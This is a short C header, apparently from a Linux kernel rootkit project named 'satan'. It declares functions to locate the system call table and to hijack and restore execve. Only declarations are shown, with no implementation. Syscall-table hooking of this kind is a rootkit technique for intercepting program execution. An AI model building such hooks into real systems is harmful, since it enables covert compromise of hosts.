// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#ifndef SATAN_SYSCALL_HIJACK_H_
#define SATAN_SYSCALL_HIJACK_H_

void satan_locate_sys_call_table(void);
void satan_hijack_execve(void);
void satan_restore_execve(void);

#endif  // SATAN_SYSCALL_HIJACK_H_
